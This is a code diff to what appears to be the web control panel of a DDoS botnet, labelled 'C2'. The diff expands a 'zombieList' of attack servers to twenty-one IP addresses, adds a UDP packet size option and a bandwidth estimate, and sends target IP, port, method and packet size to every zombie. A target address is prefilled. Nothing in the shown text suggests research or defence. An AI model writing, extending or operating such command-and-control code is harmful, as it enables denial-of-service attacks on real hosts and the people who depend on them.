@@ -67,7 +67,7 @@
     
     <div class="container">
         <div class="mRow">
-            <h2>Mao Cluster - C2</h2>
+            <h2>LytraG Cluster - C2</h2>
         </div>
         <div class="mRow">
             <input type="text" class="form-control" id="targetIP" placeholder="IP" value="116.12.155.107">
@@ -89,12 +89,17 @@
             <label>Multiprocessing Forks:</label>
             <input type="text" class="form-control" id="targetProcesses" placeholder="Port" value="1">
         </div>
+        <div class="mRow">
+            <label>UDP Packet Size:</label>
+            <input type="text" class="form-control" id="udpPacketSize" placeholder="128" value="128">
+        </div>
         <div class="mRow btnRow">
             <button class="btn btn-primary maoPrimary actionBtn" onclick="startAll()">Start All</button>
             <button class="btn btn-primary maoPrimary actionBtn" onclick="stopAll()">Stop All</button>
             <button class="btn btn-success maoSuccess actionBtn" onclick="sanityAll()">Sanity Check</button>
         </div>
         <div class="mRow">
+            <p id="overviewText" style="color:#ffffff;"></p>
             <textarea class="console form-control" id="console" readonly></textarea>
         </div>
     </div>
@@ -105,8 +110,15 @@
 
 
         var zombieList = [
-            "34.87.86.212"
+        "34.142.233.169", "35.241.81.70", "34.150.105.119", "34.81.207.52", "35.229.230.229", "34.124.138.180", "34.87.62.156", 
+        "34.126.96.94", "34.87.138.158", "34.87.133.85", "35.243.122.244", "35.221.87.122", "34.101.148.195", "34.101.169.113", 
+        "34.143.161.245", "34.87.173.100", "35.247.167.233", "34.101.251.242", "34.128.104.141", "35.244.67.128", "34.151.109.222"
+
+
         ];
+        
+        document.getElementById('overviewText').innerText = `${zombieList.length} Servers | ~${55 * zombieList.length}mBit/s`;
+
         var sanityList = {
             
         }
@@ -128,6 +140,7 @@
             var targetPort = document.getElementById('targetPort').value;
             var targetMethod = document.getElementById('targetMethod').value;
             var targetProcesses = document.getElementById('targetProcesses').value;
+            var udpPacketSize = document.getElementById('udpPacketSize').value;
 
             var x = new Date();
             var time = x.toTimeString().substr(0,8);
@@ -142,7 +155,8 @@
                         "trg" : target,
                         "port" : targetPort,
                         "method" : targetMethod,
-                        "processes" : targetProcesses
+                        "processes" : targetProcesses,
+                        "udpPacketSize" : udpPacketSize
                     }),
                     timeout: 5000,
                     success: function (data) {
